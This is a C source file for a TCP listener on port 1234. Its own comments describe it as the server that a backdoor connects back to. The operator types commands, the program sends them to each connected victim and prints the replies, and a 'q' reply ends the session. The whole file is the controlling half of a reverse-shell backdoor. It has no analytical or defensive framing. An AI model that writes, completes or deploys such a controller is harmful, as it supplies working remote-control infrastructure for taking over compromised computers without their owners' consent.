#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#define BUFFER_SIZE 65536
// TODO:
//   1. Open a connection for backdoor to connnect back to
//   2. send info back and forth through socket
//   3. ensure conneciton remains open
//
//
//
//   TODO: add help functionality
//

int main(void) {
  struct sockaddr_in server_address;
  int socket_file_descriptor, connection_file_descriptor;
  char socket_buffer[BUFFER_SIZE];
  int bytes_recieved;

  socket_file_descriptor = socket(AF_INET, SOCK_STREAM, 0);

  memset(&server_address, '0', sizeof(server_address));

  server_address.sin_family = AF_INET;
  server_address.sin_addr.s_addr = INADDR_ANY;
  server_address.sin_port = htons(1234);

  int iResult;
  iResult = bind(socket_file_descriptor, (struct sockaddr *)&server_address,
                 sizeof(server_address));
  if (iResult == -1) {
    printf("bind failure");
    return 1;
  }

  listen(socket_file_descriptor, 20);

  while (1) {
    memset(&socket_buffer, '0', sizeof(socket_buffer));
    connection_file_descriptor =
        accept(socket_file_descriptor, (struct sockaddr *)NULL, NULL);
    printf("\n> ");
    if (fgets(socket_buffer, sizeof(socket_buffer), stdin) == NULL) {
      printf("Error reading input.\n");
      break;
    }

    socket_buffer[strcspn(socket_buffer, "\n")] = '\0';

    char message[BUFFER_SIZE];
    snprintf(message, sizeof(message), "%s\r\n", socket_buffer);
    // TODO: move this down to the recv msg, so you will send q and before the
    // other program exits it will send a q back so you can also exit
    //  if (strncmp(message, "q", 3) == 0) {
    //    write(connection_file_descriptor, message, strlen(message));
    //    break;
    //  }
    write(connection_file_descriptor, message, strlen(message));
    memset(&socket_buffer, '0', sizeof(socket_buffer));

    bytes_recieved =
        recv(connection_file_descriptor, socket_buffer, BUFFER_SIZE, 0);
    if (bytes_recieved > 0) {
      char msg_recieved[bytes_recieved + 1];
      strlcpy(msg_recieved, socket_buffer, sizeof(msg_recieved));
      if (strncmp(msg_recieved, "q", 1) == 0) {
        shutdown(connection_file_descriptor, SHUT_WR);
        close(connection_file_descriptor);
        return 0;
      }
      printf("%s", msg_recieved);
    }
    shutdown(connection_file_descriptor, SHUT_WR);
    sleep(1);
    close(connection_file_descriptor);
  }
}
